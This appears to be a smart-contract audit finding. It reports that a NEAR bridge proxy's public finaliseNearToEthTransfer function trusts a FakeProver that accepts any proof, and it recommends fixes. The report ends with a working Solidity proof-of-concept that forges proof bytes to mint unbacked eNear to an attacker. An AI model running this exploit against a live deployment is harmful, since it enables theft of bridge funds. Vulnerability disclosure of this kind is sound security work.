### Title
`FakeProver` Unconditionally Accepts Any Proof in `ENearProxy.finaliseNearToEthTransfer()`, Enabling Unauthorized eNear Minting — (File: `evm/src/eNear/contracts/FakeProver.sol`, `evm/src/eNear/contracts/ENearProxy.sol`)

---

### Summary

`FakeProver.proveOutcome()` is a production contract deployed as the live proof verifier for the `ENearProxy` system. It unconditionally returns `true` for every proof input without performing any cryptographic or structural verification. `ENearProxy.finaliseNearToEthTransfer()` is a public, role-unrestricted function that uses this prover as its sole proof gate. Because the function starts unpaused after `initialize()` and the prover accepts any bytes, any unprivileged attacker can supply crafted proof data to mint arbitrary eNear tokens to any recipient.

---

### Finding Description

**Root cause — `FakeProver.proveOutcome()` is a no-op verifier:**

```solidity
// evm/src/eNear/contracts/FakeProver.sol
contract FakeProver is INearProver {
    function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
        return true;   // accepts every input unconditionally
    }
}
```

This is not a test stub; it is the contract the README explicitly states will be set as `eNear`'s live prover on mainnet via `adminSstore`.

**Attacker-reachable entry point — `ENearProxy.finaliseNearToEthTransfer()`:**

```solidity
// evm/src/eNear/contracts/ENearProxy.sol  lines 80-90
function finaliseNearToEthTransfer(
    bytes memory proofData,
    uint64 proofBlockHeight
) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
    require(
        prover.proveOutcome(proofData, proofBlockHeight),  // FakeProver → always true
        "Proof should be valid"
    );
    eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
}
```

- No `onlyRole` guard — any EOA or contract can call it.
- The only protection is `whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER)`.
- `__Pausable_init()` in `initialize()` sets all flags to `0` (unpaused), so the function is live immediately after deployment.
- `prover` is `FakeProver`; the `require` always passes.
- The call then reaches `eNear.finaliseNearToEthTransfer()`, which also consults its own prover — also set to `FakeProver` — and mints eNear to the address encoded in `proofData`.

**End-to-end exploit path:**

1. Attacker crafts `proofData` encoding `recipient = attacker_address`, `amount = MAX_UINT128`, using the Borsh layout expected by the legacy eNear contract (the format is public and documented in `ENearProxy.mint()` itself, lines 58–68).
2. Attacker calls `ENearProxy.finaliseNearToEthTransfer(proofData, 0)` while `PAUSED_LEGACY_FIN_TRANSFER == 0` (the default post-`initialize()` state).
3. `FakeProver.proveOutcome()` returns `true`.
4. `eNear.finaliseNearToEthTransfer(proofData, 0)` executes; `eNear`'s own prover is also `FakeProver`, so it also passes.
5. eNear mints the specified amount to the attacker.

The proof format is not secret: `ENearProxy.mint()` constructs it in plain Solidity (lines 58–68), giving any observer the exact byte layout needed.

---

### Impact Explanation

**Critical — Unauthorized creation of wrapped bridge assets.**

eNear is the wrapped NEAR token on Ethereum. Minting it without a corresponding NEAR lock inflates supply without backing, allowing the attacker to sell unbacked eNear on the open market and drain the NEAR locked in the bridge. Every successful call mints up to `uint128` tokens to an arbitrary recipient. The nonce in `currentReceiptId` is incremented by `ENearProxy.mint()` but not by `ENearProxy.finaliseNearToEthTransfer()`, so replay protection from the receipt-ID counter does not apply to the attacker's path; the attacker can use any receipt ID not already consumed.

---

### Likelihood Explanation

**Medium.** The attack window is open by default: `initialize()` leaves `PAUSED_LEGACY_FIN_TRANSFER = 0`. The README documents that the admin must call `pauseAll()` as a post-deployment step, but this is an operational obligation, not a contract-enforced invariant. Any deployment where `pauseAll()` is delayed, omitted, or later reversed (e.g., to re-enable the legacy path) exposes the full attack surface to any unprivileged caller. The attacker needs no keys, no role, and no prior state — only the ability to send a transaction.

---

### Recommendation

1. **Remove `ENearProxy.finaliseNearToEthTransfer()` entirely.** The README states the legacy path is intentionally disabled; the function should not exist in a deployed contract that uses `FakeProver`.
2. **If the legacy path must be preserved**, gate it with `onlyRole(MINTER_ROLE)` (matching `mint()`) so only trusted callers can invoke it, and replace `FakeProver` with a real proof verifier.
3. **Enforce the pause at construction time**: call `_pause(PAUSED_LEGACY_FIN_TRANSFER)` inside `initialize()` so the function is never live by default, regardless of deployment sequencing.
4. **Document the security invariant explicitly in the contract**: add a comment or `require` that `prover != address(fakeProver)` before any public proof-gated function executes, or store a boolean `legacyPathDisabled` set at init.

---

### Proof of Concept

```solidity
// Attacker contract (no privileges required)
interface IENearProxy {
    function finaliseNearToEthTransfer(bytes calldata, uint64) external;
}

contract Exploit {
    function run(address eNearProxy, address attacker, uint128 amount, bytes memory nearConnector) external {
        // Reproduce the Borsh layout from ENearProxy.mint() lines 58-68
        bytes memory fakeProof = bytes.concat(
            new bytes(72),
            hex"01000000",
            abi.encodePacked(uint256(9999)),   // any unused receiptId
            new bytes(24),
            abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
            abi.encodePacked(nearConnector),
            hex"022500000000",
            abi.encodePacked(Borsh.swapBytes16(amount)),
            abi.encodePacked(attacker),
            new bytes(280)
        );
        // ENearProxy.PAUSED_LEGACY_FIN_TRANSFER == 0 by default after initialize()
        // FakeProver.proveOutcome() returns true for any input
        IENearProxy(eNearProxy).finaliseNearToEthTransfer(fakeProof, 0);
        // eNear balance of `attacker` increases by `amount` with no NEAR locked
    }
}
```